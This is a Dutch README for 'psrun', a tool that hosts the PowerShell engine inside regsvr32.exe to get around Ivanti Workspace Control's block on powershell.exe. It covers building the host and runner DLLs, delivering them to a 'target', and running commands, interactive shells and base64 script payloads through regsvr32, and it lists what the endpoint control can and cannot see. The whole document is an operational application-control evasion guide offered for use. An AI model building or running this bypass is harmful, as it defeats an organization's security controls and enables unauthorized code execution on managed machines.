# psrun — code-exec springboard via regsvr32 (in-process PowerShell)

Ivanti Workspace Control blokkeert `powershell.exe`/`pwsh.exe` als executable.
psrun host de CLR **in het regsvr32.exe process** en draait daar de PowerShell
engine (`System.Management.Automation`). Er wordt **geen** powershell/pwsh
process gestart: alleen `regsvr32.exe` plus twee DLL-loads zijn zichtbaar.
Geen registry writes, geen elevation, geen VC redist, geen config files.

```
regsvr32.exe ──loads──> psrun_host.dll ──hosts──> CLR v4 ──runs──> PS engine
                                                        (PSRunner.dll)
```

---

## 1. Prereqs (eenmalig, build machine)

```sh
# macOS (Apple Silicon native — geen Rosetta nodig; de cross-compiler
# draait op arm64 en levert x64 Windows-binaries):
brew install mingw-w64
brew install --cask dotnet-sdk
```

Linux werkt identiek (`apt install mingw-w64 gpg? nee: g++-mingw-w64-x86-64
+ dotnet-sdk via packages.microsoft.com of install script).

> Windows als buildbak kan ook, maar is niet nodig: alles hieronder gaat
> vanaf mac/linux. De target zelf wordt nooit op gebouwd.

## 2. Bouwen

```sh
cd ~/Cross-VM/psrun

# 2a. native host  ->  psrun_host.dll
./build_host_mac.sh

# 2b. managed runner  ->  PSRunner.dll (komt in de projectroot terecht)
dotnet build PSRunner.csproj -c Release
```

Controle:

```sh
ls -la psrun_host.dll PSRunner.dll
# psrun_host  ~110 KB   PSRunner ~12 KB, beide verse timestamps
```

`build_host_mac.sh` print de imports van de dll — verwacht alleen
`KERNEL32.dll`, `USER32.dll` en `api-ms-win-crt-*` (UCRT, inbox in Windows).

## 3. Deliveren naar de target

Precies **twee** bestanden, in **dezelfde** map, bijv. `C:\temp\`:

```
psrun_host.dll
PSRunner.dll
```

- NIETS anders is nodig (geen .cs, geen SMA.dll — die bindt aan de GAC)
- versie-check: bestandsgrootte op de target = `ls -la` op de mac
- nieuwe map gebruiken als er oude gelockte dll's rondzwerven
  (een geladen DLL mag niet overschreven worden)

## 4. Gebruiken (op de target, via eigen lanceermiddel)

**Let op: altijd de 64-bit regsvr32 (`System32`, niet `SysWOW64`).**

### 4a. Saniteitcheck (eenmalige exec, output naar bestand)

```
regsvr32 /s /n /i:"-c whoami" C:\temp\psrun_host.dll
type %TEMP%\psrun.log
```

Verwacht: header `=== host: regsvr32 pid N ===` + whoami-output.

### 4b. Interactieve shell op de target zelf

```
regsvr32 /s /n /i:"-con" C:\temp\psrun_host.dll
```

Opent een **consolevenster op de desktop van die user-session** met een
`PS>`-prompt. Typen = PowerShell, engine in-process. `exit` sluit netjes.
Variabelen/cd blijven per commando bewaard. Let op: geen venster als de
launch in session 0/services plaatsvindt — dan in users-context lanceren.

### 4c. Payload via scriptbestand

```
regsvr32 /s /n /i:"-f C:\pad\task.ps1 -Param1 waarde" C:\temp\psrun_host.dll
```

### 4d. Lange/quoted one-liners (cmdline-limiet omzeilen)

```
set PSRUN_ARGS=-c <script of -d base64>
regsvr32 /s C:\temp\psrun_host.dll
```

### Arg grammar (PSRunner)

| arg | betekenis |
|---|---|
| `-con` | console-window shell op de target |
| `-shell <dir>` | file-based: `NAME.in` → `NAME.out`, state persistent, `exit` stopt |
| `-c <script>` | one-shot, rest van de regel = script |
| `-f <path.ps1> [args]` | one-shot scriptbestand, rest = parameters |
| `-out <file>` | output path (default `%TEMP%\psrun.log`) |
| `-raw` | geen `Out-String`; zet `-out`/`-raw` vóór `-c` |

Output altijd via `Write-Output`, niet `Write-Host` (geen host-UI).

## 5. Problemen oplossen

| bestand | inhoud |
|---|---|
| `%TEMP%\psrun.log` | script-output + `host: <proces> pid N` header |
| `%TEMP%\psrun_err.log` | native failures, **met timestamp + grootte/datum van de gevonden PSRunner.dll** |
| `%TEMP%\psrun_fatal.log` | managed excepties met stack (console setup e.d.) |

Klassiekers:

| symptoom | oorzaak → oplossing |
|---|---|
| `PSRunner.dll niet gevonden in: ...` | geen/misplaatste runner → zelfde map als host |
| `runner gevonden ... (N bytes)` wijkt af van mac | stale copy → vers leveren |
| `hr=0x80131523` | entry niet gevonden/throw in shell-setup → `psrun_fatal.log` |
| `hr=0x8007000B` | x86/x64 mismatch → `System32\regsvr32` |
| geen venster bij `-con` | launch in session 0 → users-context gebruiken |
| `regsvr32: dll geladen, DllInstall mislukt` | zie err-log; zonder `/s` voor de dialog |

## 6. Vereisten op de target

- x64 Windows, launch via 64-bit regsvr32
- .NET Framework 4.x (CLR `v4.0.30319`) — Win7/10/11 standaard
- Windows PowerShell 5.1 engine (GAC) — Win10/11 standaard
- beide dll's in dezelfde map, leesbaar voor de user
- interactieve session voor `-con`

## 7. Hardcoded feiten (wetenswaardig bij aanpassen)

- entry-contract: type `PSRunner.Entry`, method `public static int Run(string)`
  — staat in zowel `psrun_host.cpp` als `PSRunner.cs`
- CLR runtime string `v4.0.30319` en bestandsnaam `PSRunner.dll` (naast de host)
- logs in `%TEMP%`; arg-buffer 8192 tekens; `MAX_PATH` paden
- output formatting `Out-String -Width 200`; shell-poll 300 ms
- IWC ziet: regsvr32.exe + `clr.dll`/`mscoree` + `PSRunner.dll` +
  `System.Management.Automation` loads. Geen child-processen.

## 8. Aanpassen & herbouwen

| wat | waar | daarna |
|---|---|---|
| payload/logica/args | `PSRunner.cs` | `dotnet build PSRunner.csproj -c Release`, alleen `PSRunner.dll` her-deliveren |
| CLR startup, entrypoints, logging | `psrun_host.cpp` | `./build_host_mac.sh`, alleen `psrun_host.dll` her-deliveren |

Entry host ↔ runner contract niet wijzigen zonder beide te rebuilden.
